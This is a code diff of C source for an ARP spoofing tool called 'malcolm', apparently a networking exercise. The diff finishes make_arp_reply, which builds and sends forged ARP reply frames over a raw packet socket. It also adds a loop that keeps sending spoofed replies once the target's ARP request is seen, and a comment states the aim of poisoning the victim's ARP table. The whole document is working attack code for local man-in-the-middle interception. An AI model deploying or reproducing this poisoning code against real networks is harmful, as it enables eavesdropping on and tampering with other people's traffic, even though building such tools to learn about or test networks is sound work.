@@ -23,21 +23,47 @@
 //     unsigned char   arp_tpa[4];  /* Target protocol address */
 // };
 
-bool    make_arp_reply(t_malcolm *malcolm)
+bool    make_arp_reply(t_malcolm *malcolm, int reply_num)
 {
     unsigned char packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
     struct ethhdr *eth_header;
     struct ether_arp *arp_header; 
     struct sockaddr_ll sa; //! for sending on particular socket
-
-    eth_header = (struct ethhdr *)packet;
-
+    
     //! PUTTING MALCOLM AND VICTIM MAC ADRESS IN ARP FRAME
+    eth_header = (struct ethhdr *)packet;
     memcpy(eth_header->h_dest, malcolm->target->mac_addr, ETH_ALEN);
     memcpy(eth_header->h_source, malcolm->source->mac_addr, ETH_ALEN);
     eth_header->h_proto = htons(ETH_P_ARP);
 
-    //! TO CONTINUE
+    //! MAKING ARP HEADER (arphdr)
+    arp_header = (struct ether_arp *)(packet + sizeof(struct ethhdr));
+    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); //! hardware type : ethernet
+    arp_header->ea_hdr.ar_pro = htons(ETH_P_IP);     //! Protocol type : IPv4
+    arp_header->ea_hdr.ar_hln = ETH_ALEN;            //! Hardware adress length
+    arp_header->ea_hdr.ar_pln = 4;                   //! Hardware adress length
+    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY);    //! Operation     : ARP Reply
+    //! MAKING ARP HEADER (ether_arp)
+    memcpy(arp_header->arp_sha, &malcolm->source->mac_addr, ETH_ALEN);
+    memcpy(arp_header->arp_spa, &malcolm->source->ip_addr.s_addr, 4);
+
+    memcpy(arp_header->arp_tha, &malcolm->target->mac_addr, ETH_ALEN);
+    memcpy(arp_header->arp_tpa, &malcolm->target->ip_addr.s_addr, 4);
+
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family = AF_PACKET;
+    sa.sll_ifindex = malcolm->interface_index;
+    sa.sll_halen   = ETH_ALEN;
+    memcpy(sa.sll_addr, malcolm->target->mac_addr, ETH_ALEN);
+
+    ssize_t bytes_sent = sendto(malcolm->socket_fd, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa));
+    if (bytes_sent < 0) {
+        LOG_ERROR("Failed to send ARP reply");
+        return false;
+    } else {
+        printf("Sent %zd bytes (%d : RP reply packet).\n", bytes_sent, reply_num);
+        return true;
+    }
 }
 
 bool	waiting_arp_request(t_malcolm *malcolm)
@@ -54,8 +80,7 @@ bool	waiting_arp_request(t_malcolm *malcolm)
         ssize_t len = recvfrom(malcolm->socket_fd, malcolm->buffer, sizeof(malcolm->buffer), 0, NULL, NULL);
         if (len < 0) {
             if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                // Pas de données disponibles, attendre avant de réessayer
-                usleep(200000);
+                usleep(20000);
                 continue;
             } else {
                 LOG_ERROR("Failed to read on buffer");
@@ -68,9 +93,6 @@ bool	waiting_arp_request(t_malcolm *malcolm)
         if (ntohs(eth->h_proto) == ETH_P_ARP) { //! IF ARP PACKET
 			printf("\033[1A\033[2K\r");
 			LOG_INFO("Found a ARP frame");
-            // printf("ethhdr->h_dest   : %02x:%02x:%02x:%02x:%02x:%02x\n", eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
-            // printf("ethhdr->h_source : %02x:%02x:%02x:%02x:%02x:%02x\n", eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);
-            // printf("ethhdr->h_proto  : %d\n", ntohs(eth->h_proto));
             
             struct ether_arp *arp = (struct ether_arp *)(malcolm->buffer + sizeof(struct ethhdr));
         
@@ -87,14 +109,29 @@ bool	waiting_arp_request(t_malcolm *malcolm)
                 
                 struct in_addr malcolm_src_ip;
                 if (inet_aton(malcolm->target->ip, &malcolm_src_ip) && src_ip.s_addr == malcolm_src_ip.s_addr) {
-                    // printf("target spotted\n");
-                    LOG_INFO("Found Target !\n");
-                    // make_arp_reply(malcolm); //! MAKE ARP REPLY TO POISOIN VICTIME ARP TABLE
-                    break;
+                    if (make_arp_reply(malcolm, 0)) {
+                        LOG_INFO("Successfully sent initial spoofed ARP reply.");
+                        int reply_counter = 0;
+                        while (signal_handler()) { 
+                            if (reply_counter > 5)
+                                return false;
+                            else if (make_arp_reply(malcolm, reply_counter)) {
+                                reply_counter++;
+                            } else {
+                                LOG_ERROR("Failed to send subsequent ARP reply.");
+                                return (true);
+                            }
+                            usleep(200000); 
+                        }
+                        return true;
+                    } else {
+                        LOG_ERROR("Failed to send initial spoofed ARP reply.");
+                        return false;
+                    }
                 }
             }
         }
-        usleep(100000);
+        usleep(10000);
     }
     return (false);
 }
